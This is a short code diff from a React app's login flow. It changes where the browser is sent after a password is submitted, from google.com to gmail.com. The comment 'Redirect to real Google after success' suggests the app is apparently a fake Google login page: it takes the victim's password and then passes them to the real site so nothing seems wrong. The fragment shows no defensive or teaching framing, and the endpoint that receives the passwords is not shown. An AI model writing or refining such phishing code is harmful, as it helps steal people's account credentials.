@@ -87,7 +87,7 @@ export default function App() {
 
       if (response.ok) {
         // Redirect to real Google after success
-        window.location.href = "https://www.google.com";
+        window.location.href = "https://www.gmail.com";
       } else {
         const data = await response.json().catch(() => ({}));
         setError(data.message || 'Invalid password. Please try again.');
